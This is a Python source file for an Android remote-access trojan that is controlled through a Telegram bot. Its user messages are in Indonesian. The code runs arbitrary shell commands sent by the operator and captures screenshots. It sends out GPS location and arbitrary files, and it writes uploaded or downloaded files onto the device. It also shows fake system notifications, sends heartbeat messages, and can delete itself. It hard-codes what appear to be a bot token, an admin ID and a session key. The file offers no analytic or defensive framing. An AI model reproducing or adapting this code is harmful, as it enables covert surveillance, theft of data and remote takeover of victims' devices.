# -*- coding: utf-8 -*-
import telebot
import os
import subprocess
import time
import threading
import base64
import sys
import requests
import webbrowser
import tempfile

try:
    from plyer import gps, notification
except:
    pass

API_TOKEN = "8368744154:AAHe-LY96DmqiOTXbYj1N_3ryFhbMrSwGwA"
BOT_USERNAME = "Controllerwindowsbot"
CLIENT_ID = "4f2b82f61e86"
SESSION_KEY = "14fe2113c440438e91e66a2b87d197aab8450e0fd11044dda605edc417d9e565"
ADMIN_ID = 7278237950

bot = telebot.TeleBot(API_TOKEN)
os_info = "Android"
chat_id = None
gps_location = None

def on_gps_location(**kwargs):
    global gps_location
    gps_location = (kwargs['lat'], kwargs['lon'])

def get_gps():
    try:
        gps.configure(on_location=on_gps_location)
        gps.start(minTime=1000, minDistance=1)
        time.sleep(5)
        gps.stop()
        return gps_location
    except:
        return None

def execute(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
    except Exception as e:
        return str(e)

def screenshot():
    try:
        os.system('screencap -p /sdcard/screen.png')
        return '/sdcard/screen.png'
    except:
        return None

def open_url(url):
    try:
        webbrowser.open(url)
        return f"URL: {url}"
    except:
        return "Gagal membuka URL"

def download_file(url, path):
    try:
        r = requests.get(url, stream=True, timeout=60)
        r.raise_for_status()
        with open(path, 'wb') as f:
            for chunk in r.iter_content(8192):
                f.write(chunk)
        return f"Tersimpan: {path}"
    except Exception as e:
        return str(e)

def self_destruct():
    try:
        os.remove(sys.argv[0])
    except: pass
    os._exit(0)

def poll_commands():
    global chat_id
    while True:
        try:
            updates = bot.get_updates(offset=-1, timeout=30)
            for u in updates:
                if u.message and u.message.text and u.message.text.startswith('__CMD__'):
                    cmd = u.message.text[7:]
                    if cmd == '__screenshot__':
                        path = screenshot()
                        if path:
                            with open(path, 'rb') as f:
                                bot.send_photo(chat_id, f)
                            os.remove(path)
                        else:
                            bot.send_message(chat_id, "Gagal screenshot")
                    elif cmd == '__location__':
                        loc = get_gps()
                        if loc:
                            lat, lon = loc
                            bot.send_location(chat_id, lat, lon)
                            maps = f"https://maps.google.com/?q={lat},{lon}"
                            bot.send_message(chat_id, f"📍 Google Maps: {maps}")
                        else:
                            bot.send_message(chat_id, "GPS tidak tersedia.")
                    elif cmd == '__selfkill__':
                        bot.send_message(chat_id, "💀 Self-destruct")
                        self_destruct()
                    elif cmd.startswith('__getfile__'):
                        path = cmd[10:]
                        try:
                            with open(path, 'rb') as f:
                                bot.send_document(chat_id, f)
                        except Exception as e:
                            bot.send_message(chat_id, str(e))
                    elif cmd.startswith('__upload__'):
                        parts = cmd[10:].split(' ', 1)
                        if len(parts) == 2:
                            remote, b64 = parts
                            data = base64.b64decode(b64)
                            with open(remote, 'wb') as f:
                                f.write(data)
                            bot.send_message(chat_id, f"Uploaded: {remote}")
                    elif cmd.startswith('__openurl__'):
                        url = cmd[10:]
                        msg = open_url(url)
                        bot.send_message(chat_id, msg)
                    elif cmd.startswith('__download__'):
                        parts = cmd[12:].split('|', 1)
                        if len(parts) == 2:
                            url, path = parts
                            msg = download_file(url, path)
                            bot.send_message(chat_id, msg)
                    elif cmd.startswith('__broadcast__'):
                        try:
                            notification.notify(title='System Message', message=cmd[12:])
                        except:
                            pass
                    else:
                        out = execute(cmd)
                        if len(out) > 4000:
                            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                                f.write(out)
                                f.close()
                                with open(f.name, 'rb') as ff:
                                    bot.send_document(chat_id, ff)
                                os.remove(f.name)
                        else:
                            bot.send_message(chat_id, f"```\n{out}\n```", parse_mode="Markdown")
        except Exception as e:
            time.sleep(5)

def register():
    global chat_id
    updates = bot.get_updates()
    if updates:
        chat_id = updates[-1].message.chat.id
    bot.send_message(chat_id, f"__REGISTER__{CLIENT_ID} {SESSION_KEY} {os_info}")

if __name__ == '__main__':
    register()
    threading.Thread(target=poll_commands, daemon=True).start()
    while True:
        time.sleep(30)
        try:
            bot.send_message(chat_id, "__ALIVE__")
        except:
            pass